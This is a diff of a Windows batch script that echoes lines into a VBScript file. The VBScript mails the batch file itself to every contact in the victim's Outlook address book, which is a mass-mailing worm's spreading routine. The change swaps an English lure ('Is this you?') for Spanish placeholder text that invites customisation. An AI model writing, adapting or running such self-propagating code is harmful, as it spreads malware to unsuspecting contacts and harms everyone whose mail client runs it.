@@ -49,8 +49,8 @@ echo For x=1 To ae.Count>>%SystemDrive%\mail.vbs
 echo Set ci=ol.CreateItem(0)>>%SystemDrive%\mail.vbs
 echo Set Mail=ci>>%SystemDrive%\mail.vbs
 echo Mail.to=ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(x)>>%SystemDrive%\mail.vbs
-echo Mail.Subject="Is this you?">>%SystemDrive%\mail.vbs
-echo Mail.Body="Man that has got to be embarrassing!">>%SystemDrive%\mail.vbs
+echo Mail.Subject="Subject del correo">>%SystemDrive%\mail.vbs
+echo Mail.Body="Contenido del correo (modifícalo como quieras >.<)">>%SystemDrive%\mail.vbs
 echo Mail.Attachments.Add(%0)>>%SystemDrive%\mail.vbs
 echo Mail.send>>%SystemDrive%\mail.vbs
 echo Next>>%SystemDrive%\mail.vbs
